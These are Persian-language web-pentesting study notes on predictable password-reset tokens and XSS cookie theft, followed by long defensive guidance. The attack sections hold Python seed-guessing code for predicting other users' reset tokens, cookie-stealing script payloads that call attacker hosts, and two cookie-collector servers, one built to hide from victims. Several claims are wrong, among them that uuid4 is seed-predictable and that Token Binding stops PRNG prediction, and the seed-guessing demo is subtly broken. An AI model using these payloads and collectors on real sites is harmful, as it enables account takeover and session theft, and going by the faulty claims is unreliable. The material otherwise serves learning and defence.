---
Episode: E1
Date: 2026-04-25T18:28:00
Title: Web Attacks Types
tags:
  - Web_Attack
  - web_pentest
  - Web_Developing
Categories:
  - Web Attack
  - Web Pentesting
Is Finished?:
Practice Status:
Spend Time:
Tools:
banner:
banner_icon:
Home:
Previous Episode:
Next Episode:
---
-------
## Web Attacks
### PRNG Reset Attack(Pseudorandom Token Prediction)
#### Description
##### Random Functions & Attack Description
1. **`Math.random()`(Java Script) | `random()`(Python) Actually Random?**
	1. آیا الگوریتم های `random()` در پایتون و یا `Math.random()` در جاوااسکریپت واقعاً رندوم هستن؟
	2. خیر اصلا! اینها Pseudorandom هستند؛ یعنی اگه مقدار اولیه (Seed) رو بفهمیم، میتونیم کل قطار Token هایی که تا صد سال بعد تولید میشن را پیش‌بینی کنیم.
2. **`Math.random()`(Java Script) | `random()`(Python) Description:**
	1. خیلی از سیستم‌ها برای «بازیابی رمز عبور» یا «تأیید ایمیل» از توکن‌ هایی که به ظاهر تصادفی هستند استفاده میکنند.
	2. در واقع اگر که از متدهای random() پیشفرض زبان ها استفاده شود ضعف امنیتی بحساب میاد چون براحتی میشه توکن های بعدی رو حدس زد.
	3. یعنی وقتیکه مقدار اولیه یا همان Seed رو بفهمیم، میتونیم توکن بعدی رو حدس بزنیم.
3. **Where is Seed?**
	1. کتابخانه های Random در تمامی زبان های مشهور وب مانند PHP, JS, Python دارای متدی بنام `seed` هستند که مقدار Seed را دریافت و مشخص میکند.
	2. مثلا در پایتون Seed بوسیله `random.seed(seed)` دریافت میشود.
	3. **نکته:** مقدار Seed اصولا و در اکثر موارد برابر زمان فعلی سیستم است(`time.time()`) 
	4. این موضوع به این دلیل است که مقدار Seed برای هر محاسبه باید متفاوت باشد و این تابع نیز هر بار مقدار seed متفاوتی را تولید میکند.
4. **Real Scenario: Get Password of Account Using Reset Password Links**
	1. در واقعیت میتونم لینک بازیابی رمز یک اکانت(که رمز جدید درونش هست) رو قبل از اینکه به ایمیل شخص برسه برداریم و پسورد رو عوض کنم.
	2. به این نوع از حملات PRNG Reset Attack یا Pseudorandom Token Prediction گفته میشود.
5. **PRNG Reset Attack(Pseudorandom Token Prediction) Steps:**
	1. مهاجم حساب خودش را میسازد و چندین بار درخواست "بازیابی رمز عبور" می‌دهد.  
	2. توکن‌های دریافتی را تحلیل می‌کند و **Seed(مقدار اولیه)** تولید کننده اعداد تصادفی (مثلاً `time()` میلی‌ ثانیه) را مهندسی معکوس می‌کند.  
	3. حالا میتواند توکن بعدی قربانی را پیش‌بینی کند.
	4. سپس قبل از قربانی، لینک بازیابی را می‌زند و رمز را عوض می‌کند.
##### Notes
1. **Note 1: Which Machines/Systems Using this Methods?**
	1. این سیستم تولید توکی Random بوسیله توابع پیشفرض زبان در سیستم ها و ماشین های زیر استفاده میشه:
		1. سیستم‌های کوچک
		2. اکثر پلاگین‌های وردپرسی
		3. بعضی API های به اصطلاح بزرگ که عجله دارن و حتی از `uuid.uuid4()` هم استفاده نمیکنن (که اونم اگه Seed رو بفهمی قابل پیش‌بینی میشه). 
		4. بنابراین بله، سیستم uuid4() هم بر پایه Random هست و بنابراین قابل پیش بینی است.
2. **Note 2: MD5(Username + Timestamp):**
	1. بعضی سیستم‌ها از MD5(username + timestamp) استفاده میکنند.
	2. بنابراین کافیه Timestamp رو بفهمیم، در نتیجه میتونیم به سیستم نفوذ کنیم.
	3. در واقع اصلاً نیازی به کد خاصی نیست، فقط کافیه متوجه بشیم توی کدوم دقیقه و ثانیه درخواست صادر شده است.
#### Implement Attack Using Python
##### Very Simple Method
- میخواهیم یک سناریو واقعی را با پایتون بررسی کنیم. 
1. فرض کنید وبسایتی از کد زیر برای ساختن توکن استفاده میکند:
```python
import random
import time

def generate_reset_token(user_id):
    random.seed(time.time())      #مقدار Seed برابر ثانیه فعله
    return random.randint(100000, 999999)
```
2. الان ما که یک حساب کاربری در وبسایت مورد نظر داریم، به وبسایت مراجعه میکنیم و درخواست بازیابی رمز میدیم. سپس یک توکن ۶ رقمی به ایمیل مون میرسه. حالا کافیه `time.time()` رو برای همون ثانیه ای که توکن ایجاد شده را با استفاده از یک Loop تخمین بزنیم(مثلاً با مقایسه سرور و زمان خودم):
```python
import random
import time

#Token received in Email: 456123
my_token = 456123
guessed_seed = None

for i in range(-10, 10):  #Differs 10 Second After/Before Token Received
    test_seed = int(time.time()) + i
    random.seed(test_seed)
    if random.randint(100000, 999999) == my_token:
        guessed_seed = test_seed
        break

#Now we can guess TOKEN of another user
random.seed(guessed_seed)
next_token = random.randint(100000, 999999)
print(f"توکن بعدی کاربر: {next_token}")
```
- با اینکار میتونیم تا 10 ثانیه بعد، توکن بازیابی هر کاربر دیگری رو پیش بینی کنیم. فقط کافیه که Username اونرو بلد باشیم و لینک بازیابی را بسازیم. به همین راحتی
- **لینک بازیابی رمز عبور:**
	1. میشه که در وبسایت مورد نظر برای Username که میخواهیم توکنش رو محاسبه کنیم درخواست Reset پسورد را بزنیم و لینک رو از اونجا برداریم.
	2. **روش بهتر:** فرمت لینک های بازیابی رمز عبور در یک وبسایت برای تمای یوزرنیم ها یکسان است. بنابراین با رعایت فرمت لینک بازیابی رمز عبور که دریافت کردیم، برای Username جدید یک لینک بازیابی جدید میسازیم.
##### Advance Method
- [[E1-Codes-Web Attacks#PRNG Reset Attack(Pseudorandom Token Prediction)]]
#### Security Solutions
##### Methods for Against PRNG Reset Attack(Pseudorandom Token Prediction)
1. **Using `secrets` Instead of `random`:**
	1. برای دفاع در مقابل این آسیب پذیری کتابخانه `secrets` بهترین روش است.
```python
#❌ غلط - قابل پیش‌بینی
import random
token = random.randint(100000, 999999)

#✅ Secure Way
import secrets
token = secrets.token_hex(32)  #توکن ۶۴ کاراکتری هگز
#Or
token = secrets.token_urlsafe(32)  #توکن URL-safe
#یا برای عدد ۶ رقمی
token = secrets.randbelow(900000) + 100000
```
2. **Using `os.urandom()`:**
	1. استفاده از `urandom()` درون کتابخانه `os` نیز یکی دیگر از روش های ایمن برای دفاع در مقابل این حمله است.
```python
import os
token = os.urandom(32).hex()  #64 کاراکتر هگز
```
3. **Ever Never Use `time` for Seed:**
	1. هرگز و هرگز از `time` برای Seed استفاده نکنید.
```python
#❌ غلط
random.seed(int(time.time()))
#❌ باز هم غلط
random.seed(time.time_ns())  #نانوثانیه هم brute force می‌شود!
```
4. **Using Rate Limiting:**
	1. ایجاد محدودیت در Rate Limit و اعتبار زمانی
	2. مثلا روش زیر را با استفاده از Redis Database میتوانیم پیاده سازی کنیم.
```python
#محدود کردن تعداد درخواست بازیابی در هر آیپی
#(با Redis/Database پیاده‌سازی می‌شود)
RATE_LIMIT = 3  #حداکثر 3 درخواست در 15 دقیقه
RATE_WINDOW = 900  #ثانیه

#اعتبار محدود توکن
TOKEN_EXPIRY = 300  #5 دقیقه
```
5. **Add Salt to Token:**
	1. ویژگی Salt مقداریست که به توکن اضافه میشود تا هر بار عبارت جدیدی نیز به Random تولید شده اضافه شود.
	2. با اینکار اگر Seed را داشته باشیم نیز پیش بینی کردن توکن امکان پذیر نیست.
```python
import secrets
import hashlib

def generate_secure_token(email):
    salt = secrets.token_hex(16)
    random_part = secrets.token_hex(32)
    token = hashlib.sha256(f"{salt}{email}{random_part}".encode()).hexdigest()
    return token
```
##### Secure Code for Token Generation
تکه کد زیر ورژن امن برای تولید توکن است.
```python
#!/usr/bin/env python3
"""نسخه امن - همین حمله جواب نمی‌دهد"""

import secrets

class SecureServer:
    def generate_reset_token(self, user_email):
        #با secrets، هیچ Seed ای برای کشف وجود ندارد
        token = secrets.randbelow(900000) + 100000
        #یا بهتر:
        #token = secrets.token_urlsafe(32)
        return token


#تست: حمله را روی نسخه امن امتحان کنید
secure = SecureServer()
tokens = [secure.generate_reset_token("test@test.com") for _ in range(10)]

print("توکن‌های تولید شده با secrets:")
for i, t in enumerate(tokens):
    print(f"  {i+1}: {t}")

print("\n❌ هیچ الگویی قابل پیش‌بینی نیست!")
print("✅ مهاجم نمی‌تواند Seed را کشف کند چون اصلاً Seed وجود ندارد!")
```
### XSS-based Session Hijacking - Cookie Theft through Stored/Reflected XSS
#### Description
1. **What is XSS (Cross-Site Scripting) Attacks?**
	1. در این نوع از حملات مهاجم با تزریق اسکریپت Java Script کار هایی از قبیل گرفتن دسترسی، ایجاد تغییرات، از کار انداختن سرور، سرقت اطلاعات و .... را در ماشین قربانی انجام میدهد.
	2. حملات XSS یا Cross-Site Scripting انواع متفاوتی دارند که هر کدام برای منظور خاصی و با روش خاصی انجام میشوند.
2. **What is XSS-based Session Hijacking(Cookie Theft through Stored/Reflected XSS):**
	1. در این نوع حملات مهاجم یک کد جاوا اسکریپت مخرب را به صفحه وب تزریق می‌کند که کوکی نشست (Session Cookie) قربانی را می‌دزدد و برای مهاجم ارسال می‌کند. 
	2. سپس مهاجم با استفاده از این Cookie می‌تواند بدون نیاز به رمز عبور، وارد حساب قربانی شود.
	3. این حمله نوعی از Session Hijacking via XSS (Cross-Site Scripting) است که به طور دقیق‌تر بنام Cookie Theft through Stored/Reflected XSS شناخته میشود. 
	4. در میان متخصصان امنیت، به این ترکیب خاص که اسکریپت تزریق‌ شده کوکی را می‌دزدد، XSS-based Session Hijacking می‌گویند.
3. **Mechanism of XSS-based Session Hijacking for Cookie Theft Attack:** 
	1. **گام 1: یافتن نقطه تزریق XSS:**  
		1. مهاجم محلی را پیدا می‌کند که ورودی کاربر بدون فیلتر در صفحه نمایش داده می‌شود.
		2. مثلا: 
			1. بخش نظرات وبلاگ
			2. فیلد نام کاربری در پروفایل
			3. در User-Agent که در پنل ادمین نشان داده می‌شود
			4. پارامترهای GET در URL
	2. **گام 2: تزریق Payload(کد جاوا اسکریپت):**
		1. مهاجم تکه کدی مشابه زیر را تزریق میکند:
		2. `<script>`
		3. `fetch('https://attacker.com/steal?cookie=' + document.cookie);`
		4. `</script>`
	3. **گام 3: اجرا در مرورگر قربانی:**  
		1. وقتی قربانی (مثلاً ادمین) صفحه آلوده را باز می‌کند، مرورگرش بصورت خودکار اسکریپت را اجرا می‌کند.
	4. **گام 4: سرقت کوکی:**  
		1. کد `document.cookie` کوکی‌ های آن دامنه را برمی‌گرداند. 
		2. اسکریپت تزریق شده هم همین کد را به سرور مهاجم میفرستد.
	5. **گام ۵: جعل نشست(Session Hijacking):**  
		1. مهاجم Cookie دزدیده‌ شده را در مرورگر خود با استفاده از خط زیر تنظیم می‌کند:
			1. `document.cookie = "session=stolen_session_value";`
		2. سپس وبسایت هدف را باز میکند.
		3. در نتیجه با دسترسی ادمین که Cookie آن سرقت شده است، لاگین شده است. در واقع بدون رمز عبور، به عنوان ادمین وارد وبسایت میشود.
4. **Why `HttpOnly` & `Secure` not Enough?**
	1. **مکانیزم `HttpOnly`:**
		1. کاربرد: برای جلوگیری از دسترسی به `document.cookie` استفاده میشود.
		2. چرا دور زده میشود؟ در XSS، مهاجم میتواند مستقیماً درخواست HTTP بفرستد در نتیجه نیاز به خواندن Cookie نیست.!
	2. **مکانیزم `Secure`:**
		1. کاربرد: Cookie را فقط روی HTTPS ارسال میکند.
		2. چرا دور زده میشود؟ XSS در صفحه HTTPS اجرا می‌شود بنابراین Cookie باز هم میتواند ضمیمه می‌شود.
5. **Bypassing `HttpOnly` using XSS(No need to Read Cookies):**
```js
<script>
// لازم نیست کوکی را بخوانیم!
// مستقیماً یک درخواست جعلی می‌فرستیم،
// مرورگر خودکار کوکی را ضمیمه می‌کند!
fetch('/admin/delete-all-users', {method: 'POST'});
</script>
```
#### Implement Attack
##### Method 1 - Sniffer Using Flask
###### XSS Codes - Inject to Victim Website
1. ابتدا باید در وبسایت هدف، در محلی که توسط ادمین باز میشه(نظرات یا داخل User-Agent) یکی از اسکریپت زیر را تزریق کنیم. این اسکریپت فقط یک کار میکند، Cookie رو میفرسته سمت سرور خودمون
```javascript
var img = new Image();
img.src = "https://ATTACKER-SERVER.com/steal?cookie=" + document.cookie;
document.body.appendChild(img);
```
- حالا هر کسی که این صفحه رو باز کنه (مثل ادمین)، Session Cookie آن به سرور مهاجم ارسال میشه. بعد کافیه اون کوکی را در مرورگر خودمون تنظیم کنیم تا بتونیم وارد اکانت ادمین بشیم بدون اینکه پسوردش رو بدونیم.
###### Sniffer Codes - Run on Own Server
1. بنابراین باید یک Sniffer ساده هم بنویسیم که روی سرور خودمون اجرا میشه تا وقتی Cookie دریافت شد اونرو در یک فایل ذخیره کنه.(Listening, Log Received Cookies, Save Cookies to File)
2. برای نوشتن این Sniffer از Flask استفاده میکنیم(البته از HTTP Handler هم میشه استفاده کرد که در متد 2 از اون استفاده میکنیم)
  

```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/steal')
def steal():
    cookie_data = request.args.get('cookie')
    if cookie_data:
        with open('stolen_cookies.txt', 'a') as f:
            f.write(cookie_data + '\n')
        print(f"[+] Cookie Received: {cookie_data}")
    return "Cookie Received!", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```
###### Run Attack & Use Stolen Cookie
1. اجرای Sniffer در سمت سرور `python3 server.py`
2. تزریق جاوا اسکریپت به سایتی که باگ XSS داره.  
3. حالا هر کسی اون صفحه رو دید، کوکیش میاد سمت ما و در `stolen_cookies.txt` ذخیره میشه.
4. برای استفاده از کوکی میشه از افزونه‌هایی مثل `EditThisCookie` استفاده کرد، و یا اینکه میشه در کنسول مرورگر کد زیر رو جایگذاری کنیم:
	1. `document.cookie = "SESSION=..."`
##### Method 2 - Sniffer Using Python HTTP Server
###### XSS Codes - Inject to Victim Website
1. تزریق کد زیر در قسمتی از وبسایت که توسط ادمین باز میشه.
```javascript
<!-- صفحه آسیب‌پذیر: comment.php -->
<!-- مثلا کافیست این را در بخش نظرات پست کنیم -->
<script>
fetch('https://attacker.evil/collect?c=' + btoa(document.cookie));
</script>
```
###### Sniffer Codes - Run on Own Server
1. کد زیر هم که Sniffer کوکی هاست که با استفاده از HTTP Server در پایتون نوشته شده و باید در سمت سرور خودمان اجرا بشه:
```python
#!/usr/bin/env python3
"""
1-Run on Attacker Server 
2-This Server Logged Received Cookies
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import base64
import datetime

class CookieCollector(BaseHTTPRequestHandler):
    def do_GET(self):
        #Extract Cookie from URL
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        if 'c' in params:
            #base64 Decoding
            try:
                stolen_cookie = base64.b64decode(params['c'][0]).decode()
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                print(f"\n{'='*60}")
                print(f"[{timestamp}] 🍪 Cookie Hijacked!")
                print(f"Cookie Value: {stolen_cookie}")
                print(f"Attacker IP: {self.client_address[0]}")
                
                #Save Cookie into a file `stolen_cookies.txt`
                with open("stolen_cookies.txt", "a") as f:
                    f.write(f"[{timestamp}] {self.client_address[0]}: {stolen_cookie}\n")
                    
            except Exception as e:
                print(f"Error: {e}")

        #Send Response to victim(a 1*1 Gif so victim don't doubt)
        #پاسخ شفاف برای قربانی تا شک نکند
        self.send_response(200)
        self.send_header('Content-type', 'image/gif')
        self.end_headers()
        #Create 1*1 GIF Codes
        self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
    
    def log_message(self, format, *args):
        pass  #Silent in Console

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 8888), CookieCollector)
    print("🍪 سرور جمع‌آوری کوکی آماده است (پورت 8888)")
    print("🍪 Cookie Sniffer Server Ready on Port: 8888")
    print("Waiting for Received Hijacked Cookies...")
    server.serve_forever()
```
#### Security Solutions
##### First & Second Layers(Important)
1. **لایه اول: جلوگیری از XSS(مهمترین راهکار - خط مقدم دفاع):**
	1. **Escaping Output - Most Important Defense Solution:**
		1. اصل اساسی مقابله با XSS، پاک‌سازی و Escape کردن تمام داده‌های ورودی قبل از نمایش در خروجی HTML است. 
		2. این کار از تفسیر کدهای مخرب به عنوان دستورات اجرایی مرورگر جلوگیری می‌کند.
		3. با استفاده از اینکار کاراکتر های ویژه به معادل ASCII Code خود تبدیل میشوند در نتیجه اگر کد تزریقی ASCII نباشد اجرا نمیشود.
	2. **Using CSP(Content Security Policy) Header:**
	3. با استفاده از CSP فقط اسکریپت‌ های همان دامنه اجرا میشوند.
```python
#1-Escaping Output - Most Important Defense Solution
#Escape کردن خروجی - مهمترین دفاع!
from html import escape
safe_output = escape(user_input)  #output: <script> → &lt;script&gt;

#2-Using CSP(Content Security Policy) Header
#فقط اسکریپت‌های همان دامنه اجرا شوند
header("Content-Security-Policy: script-src 'self'");
```
2. **لایه دوم: استفاده از `HttpOnly + Secure`:**
	1. برای استفاده از این روش کافیست Cookie Flags های مربوط به این ویژگی ها را فعال کنیم. این فلگ ها هر کدام برای دفاع در مقابل نوعی از آسیب پذیری استفاده میشوند:
		1. `httponly=True` 
			1. جلوگیری از دسترسی به `document.cookie`
		2. `secure=True` 
			1. کارکرد `document.cookie` فقط در HTTPS
		3. `samesite='Strict'`
			1. جلوگیری از حملات CSRF
```python
#تنظیم فلگ‌های کوکی در سمت سرور
response.set_cookie(
    'session', value,
    httponly=True,   #Defense against document.cookie
    secure=True,     #Work Only on HTTPS
    samesite='Strict'  #Preventation CSRF
)
```
- **نکته بسیار مهم:**
	- ویژگی `"HttpOnly"` فقط از خواندن کوکی محافظت می‌کند. 
	- در XSS برای حمله نیازی به خواندن کوکی نداریم. 
	- پس XSS را ببندید و امن کنید، نه اینکه فقط به "HttpOnly" تکیه کنید.
3. **دفاع در مقابل PRNG Reset Attack - روش استاندارد در تمامی زبان ها:**
	1. هدف در اینجا جلوگیری از حدس‌پذیر بودن توکن‌های امنیتی (مثل توکن‌های بازیابی رمز عبور) است.
	2. اگر توکن‌ها بر اساس یک منطق قابل پیش‌بینی مثل `mt_rand()` در PHP تولید شوند، مهاجم می‌تواند مقدار آنها را پیش‌بینی کند.
	- **راهکار امن (اصل کلی برای همه زبان‌ها):**  
		1. همیشه از **ژنراتورهای اعداد تصادفی رمزنگاری‌شده (CSPRNG)** استفاده کنید. 
		2. این توابع از آنتروپی سیستم‌عامل (منابع تصادفی واقعی) استفاده می‌کنند و غیرقابل پیش‌بینی هستند.
##### Modern Defense Methods
1. **SameSite Cookie:**
	1. فلگ جدیدی که به Cookie ها اضافه شده و `samesite` نام دارد. این فلگ مقادیر متفاوتی دارد که هر کدام رفتار مشخصی دارند:
		1. `SameSite=Strict`:
			1. کوکی فقط در درخواست‌های همان سایت ارسال می‌شود.
			2. یعنی به سرور و دامنه دیگری ارسال نمیشود.
			3. بسیار کاربردی
		2. `SameSite=Lax`:
			1. کوکی در کلیک لینک‌ ها هم ارسال می‌شود.
```python
#SameSite=Strict: کوکی فقط در درخواست‌های همان سایت ارسال می‌شود
#SameSite=Lax: کوکی در کلیک لینک‌ها هم ارسال می‌شود
response.set_cookie('session', value, samesite='Strict')
```
2. **Session Fingerprinting:**
	1. فرآیند Session Fingerprinting نشست Session را به IP و User-Agent متصل میکند.
```python
#چسباندن نشست به IP و User-Agent
if session['ip'] != request.ip or session['user_agent'] != request.headers['User-Agent']:
    session.destroy()  #کوکی دزدیده شده بلااستفاده می‌شود
```
##### Token & Origin-Bound Binding
1. **Token Binding - Description:** 
	1. کوکی را به کانال TLS متصل می‌کند و در واقع فقط با Certificate موجود در ماشین ادمین کار میکند.
	2. بنابراین حتی اگر دزدیده شود هم روی کانکشن دیگر کار نمی‌کند.
	3. یکی از بهترین روش ها برای جلوگیری از حمله PRNG Reset Attack(Pseudorandom Token Prediction)
	4. پیاده سازی این روش از روش های قبلی پیچیده تر است که در ادامه بصورت مجزا توضیح میدهیم.
2. **Origin-Bound Cookie(OBC) Simple version of Token Binding:**
	1. در حالی که Token Binding یک اتصال قوی و رمزنگاری‌شده ایجاد می‌کند، Origin-Bound Cookies  یا به اختصار OBC یک مکانیزم ساده‌تر است که Cookie را فقط به یک مبدأ (ترکیب Protocol, Domain, Port) مقید و متصل می‌کند. 
	2. هدف OBC جلوگیری از لو رفتن تصادفی Cookie ها از یک سایت امن (HTTPS) به یک سایت نا امن (HTTP) است.
	3. این آسیب پذیری امنیتی "یکپارچگی ضعیف" نام دارد. 
	4. بنابراین OBC یک بهبود پیش‌فرض برای مکانیزم فعلی کوکی‌ها محسوب می‌شود و نیاز به تنظیم دستی `Secure` را از بین می‌برد.
3. **Token Binding Mechanism:**
	1. **Create Pair Keys(Private & Public Keys) in User Browser:** 
		1. مرورگر کاربر هنگام برقراری اولین ارتباط با سرور، یک جفت کلید عمومی و خصوصی(Private & Public Keys) منحصر به‌ فرد برای آن سرور خاص تولید می‌کند. 
		2. این کلید می‌تواند در یک ماژول امن سخت‌ افزاری (TPM - Trusted Platform Module) ذخیره شود تا از سرقت آن جلوگیری شود.
		3. منابع: 
			1. [ldapwiki](https://ldapwiki.com/wiki/Wiki.jsp?page=Token%20Binding%20Protocol&skin=raw)
			2. [ldapwiki-2](https://ldapwiki.com/wiki/Wiki.jsp?page=Token%20Binding%20Protocol)
	2. **Negotiate in TLS Handshake:** 
		1. در فرآیند دست‌دهی(Handshake) اولیه TLS، کلاینت و سرور از طریق یک افزونه (Extension) مخصوص با یکدیگر مذاکره می‌کنند که آیا از Token Binding پشتیبانی می‌کنند یا خیر و بر سر نسخه و پارامترهای کلید به توافق می‌رسند.
		2. این کار با استاندارد RFC 8472 تعریف شده است.
		3. منابع:
			1. [rfc-editor](https://www.rfc-editor.org/rfc/rfc8472.html).
	3. **Sing Session Key:**
		1. پس از برقراری اتصال TLS، مرورگر با استفاده از کلید خصوصی(Private Key) خود، یک "اثبات مالکیت" (Proof-of-Possession) روی کلید نشست TLS امضا می‌کند.
		2. سپس آن را به همراه کلید عمومی(Public Key) خود (که Token Binding ID نام دارد) برای سرور می‌فرستد.
		3. منابع:
			1. [ldap-wiki](https://ldapwiki.com/wiki/Wiki.jsp?page=Token%20Binding%20Protocol&skin=raw).
	4. **Export Token Binding ID:**
		1. سرور هنگام ساختن Session Cookie یا OAuth، شناسه Token Binding ID کاربر را به صورت رمزنگاری‌شده درون خود توکن قرار می‌دهد.
		2. برای مثال، یک Session Cookie دیگر فقط یک رشته تصادفی نیست، بلکه به آن TLS هم متصل شده است.
		3. منابع:
			1. [ldap-wiki](https://ldapwiki.com/wiki/Wiki.jsp?page=Token%20Binding%20Protocol&skin=raw)[](http://mail.spinics.net/lists/ietf-ann/msg105514.html).
	5. **Check/Accept Identity in Future Requests:**
		1. در درخواست‌های بعدی، مرورگر دوباره همان فرآیند امضا TLS را انجام می‌دهد. 
		2. سرور بررسی می‌کند که Token Binding ID موجود در Cookie، با Token Binding ID که به تازگی توسط مرورگر امضا شده، مطابقت داشته باشد.
		3. در نتیجه اگر Cookie از ماشین Attacker آمده باشد، مقدار امضا متفاوتی دارد و بی اعتبار میشود.
	6. **Security Advantages - Final Result:**
		1. اگر یک مهاجم Cookie را بدزدد و از یک اتصال دیگر سعی در استفاده از آن کند، سرور متوجه عدم تطابق شناسه Token Binding شده و درخواست را رد می‌کند، زیرا مهاجم به کلید خصوصی ذخیره‌شده در TPM دسترسی ندارد.
		2. منابع:
	- https://ldapwiki.com/wiki/Wiki.jsp?page=Token%20Binding%20Protocol
##### Solutions for Other Languages
###### Solutions for PHP/Wordpress/HTML
1. **Escaping Output - Most Important Defense Solution**
	- اصل اساسی مقابله با XSS، پاک‌سازی و Escape کردن تمام داده‌های ورودی قبل از نمایش در خروجی HTML است.
	- وردپرس و PHP توابع داخلی قدرتمندی برای این کار دارند که باید با توجه به نوع داده خروجی استفاده شوند.
- 1.1: **URL Output:**
	- برای لینک‌ها و تصاویر از تابع `esc_url()` استفاده کنید:
```php
<img src="<?php echo esc_url( $user_image_url ); ?>" />
```
- 1.2: **HTML Output:** 
	- اگر بخواهیم عبارت دریافت شده را در Content صفحه نمایش دهیم از `esc_html()` استفاده میکنیم.
- 1.3: **Attributes Output:**
	- برای قرار دادن داده در attribute های HTML از `esc_attr()` استفاده میکنیم.
```php
<?php
//یک ورودی مخرب از کاربر
$user_comment = "<script>alert('Hacked!')</script> <a href='evil.com'>Click</a>";

//==========================================
// esc_html() : مناسب برای نمایش در بدنه HTML
//==========================================
echo "<div class='comment'>";
echo esc_html($user_comment);
echo "</div>";
//خروجی: <script>alert('Hacked!')</script> <a href='evil.com'>Click</a>
//تگ‌ها به صورت متن ساده نمایش داده می‌شوند و اجرا نمی‌شوند!


//==========================================
// esc_attr() : مناسب برای داخل attribute های HTML
//==========================================
$user_title = 'Hacker"s Tooltip" onclick="alert(1)"';
echo "<span title='" . esc_attr($user_title) . "'>Hover me</span>";
// خروجی: <span title='Hacker&quot;s Tooltip&quot; onclick=&quot;alert(1)&quot;'>Hover me</span>
// کوتیشن‌ها و کاراکترهای خطرناک Escape می‌شوند
?>
```
- 1.4: **HTML Output Which need Limited HTML Codes:** 
	- اگر بخشی از داده‌ ها نیاز به تگ‌های HTML خاصی دارند (مثلاً `<a>` یا `<br>`)، از `wp_kses()` برای تعریف لیست مجاز استفاده میکنیم:
```php
$allowed_html = array(
    'a' => array( 'href' => array() ),
    'br' => array(),
    'strong' => array(),
);
echo wp_kses( $user_content, $allowed_html );
```
2. **Defense Against PRNG Reset Attack with `random_bytes()` & `random_int()`**
	1. در PHP، هرگز از `rand()` یا `mt_rand()` برای اهداف امنیتی استفاده نکنید. 
	2. به جای آن، توابع زیر که استاندارد طلایی هستند استفاده کنید:
		- `random_bytes()`: برای تولید یک رشته باینری از بایت‌های تصادفی امن.
		- `random_int()`: برای تولید یک عدد صحیح تصادفی امن در یک بازه مشخص.
```php
//==========================================
// Brief Examples:
//==========================================

//تولید یک توکن 32 بایتی و تبدیل به هگز - random_bytes()
$secure_token = bin2hex(random_bytes(32));

//تولید کد تأیید ۶ رقمی - random_int()
$verificationCode = random_int(100000, 999999);


//==========================================
// random_bytes(int $length)
//==========================================
<?php

// تولید ۳۲ بایت تصادفی (برای توکن بازیابی رمز)
$rawBytes = random_bytes(32);

// تبدیل به هگز - بهترین روش برای توکن‌ها
$token = bin2hex(random_bytes(32));
echo "توکن بازیابی رمز: " . $token . "\n";
// خروجی: a3f1098b2c4d7e1a9b3c5d7e9f1a3b5c7d9e1a3b5c7d9e1a3b5c7d9e1a3b
// (۶۴ کاراکتر، غیرقابل حدس)

// تبدیل به Base64
$base64Token = base64_encode(random_bytes(32));
echo "توکن Base64: " . $base64Token . "\n";


//==========================================
// random_int(int $min, int $max)
//==========================================

// تولید کد تأیید ۶ رقمی
$verificationCode = random_int(100000, 999999);
echo "کد تأیید ۶ رقمی: " . $verificationCode . "\n";
// خروجی: 847291 (واقعاً تصادفی و امن)

// تولید عدد بین ۱ تا ۱۰۰
$randomNumber = random_int(1, 100);
echo "عدد تصادفی ۱-۱۰۰: " . $randomNumber . "\n";

// انتخاب تصادفی از یک آرایه
$colors = ['red', 'blue', 'green', 'yellow', 'purple'];
$randomIndex = random_int(0, count($colors) - 1);
$randomColor = $colors[$randomIndex];
echo "رنگ تصادفی: " . $randomColor . "\n";


//==========================================
// ❌ هرگز این کار را نکنید! (برای مقایسه)
//==========================================
$weakToken = mt_rand(100000, 999999);  // قابل پیش‌بینی!
$weakToken2 = rand(100000, 999999);    // حتی ضعیف‌تر!



//==========================================
// Real World Examples
//==========================================

// تابع کمکی برای تولید توکن امن
function generateSecureToken($length = 32) {
    return bin2hex(random_bytes($length));
}
// استفاده
$resetToken = generateSecureToken();
echo "Secure Reset Token: " . $resetToken . "\n";


// تابع کمکی برای کد تأیید
function generateVerificationCode($digits = 6) {
    $min = 10 ** ($digits - 1);
    $max = (10 ** $digits) - 1;
    return random_int($min, $max);
}
// استفاده
$code = generateVerificationCode();
echo "Confrimation Code: " . $code . "\n";
```

###### Solutions for Java Script/Node JS
0. **Don't Using `innerHTML` Directly:**
	1. در جاوا اسکریپت، استفاده مستقیم از `innerHTML` با داده‌ های کاربر بزرگترین تهدید است. 
	2. در واقع با استفاده از `innerHTML` اگر در داده ورودی کد جاوا اسکریپت باشد، کد اجرا میشود. 
	3. بجای آن باید از جایگزین های امن استفاده کنیم که داده های ورودی را Escape(Sanitize) میکنند.
	4. پس از Escape(Sanitize) تمامی داده ورودی در قالب Plain Text دیده میشوند و در نتیجه اگر کدی هم درون آن باشد به هیچ وجه اجرا نمیشود.
1. **Escape(Sanitize) Output in Java Script - `textContent` & `createTextNode`** :
	- توابع امن که بجای `innerHTML` میتوانیم از آنها استفاده کنیم عبارتند از: `textContent` و `createTextNode`
```javascript
<!DOCTYPE html>
<html>
<body>
<div i
d="output"></div>

<script>
//داده مخرب از کاربر (مثلاً از URL)
const userData = "<img src='x' onerror='alert(\"XSS Attack!\")'> <b>Hello</b>";

// ==========================================
// ❌ روش خطرناک: innerHTML
// ==========================================
// document.getElementById('output').innerHTML = userData;
// !!! کد مخرب اجرا می‌شود !!!

// ==========================================
// ✅ روش امن: textContent
// ==========================================
document.getElementById('output').textContent = userData;
// خروجی: متن خام نمایش داده می‌شود، هیچ کدی اجرا نمی‌شود
// کاربر می‌بیند: <img src='x' onerror='alert("XSS Attack!")'> <b>Hello</b>

// ==========================================
// ✅ روش امن دیگر: createTextNode
// ==========================================
const textNode = document.createTextNode(userData);
document.getElementById('output').appendChild(textNode);

</script>

</body>
</html>
```
2. **Escaping(Sanitize) with `DOMPurify`:**
	- برای سناریوهای پیچیده‌تر، از کتابخانه‌های معروف و امن مانند `DOMPurify` برای Escape کد HTML قبل از درج در صفحه استفاده کنید.
